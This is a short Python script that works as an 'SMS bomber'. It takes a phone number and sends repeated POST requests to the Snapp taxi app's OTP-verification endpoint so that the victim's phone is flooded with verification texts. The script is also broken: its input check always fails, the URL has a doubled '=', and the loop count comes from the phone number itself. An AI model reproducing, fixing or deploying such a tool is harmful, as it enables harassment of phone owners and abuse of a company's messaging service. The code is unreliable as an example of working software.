from colorama import Fore
import requests
import sys
import os
import time
os.system("cls")
pn=input(Fore.BLUE+"""Please enter your req phone number""")
if pn==None or pn=="" or type(pn)!= int:
    print(Fore.RED+"Please enter a valid phone number!")
else:
    url="https://app.snapp.taxi/verify-cellphone-otp/?cellphone=="+pn+"&redirect_to=%2F"
os.system("cls")
for i in range(int(pn)):
    requests.post(url)
    print(Fore.RED+"["+str(i)+"]"+Fore.LIGHTGREEN_EX+"Requests send for send sms!")
time.sleep(2)
print()
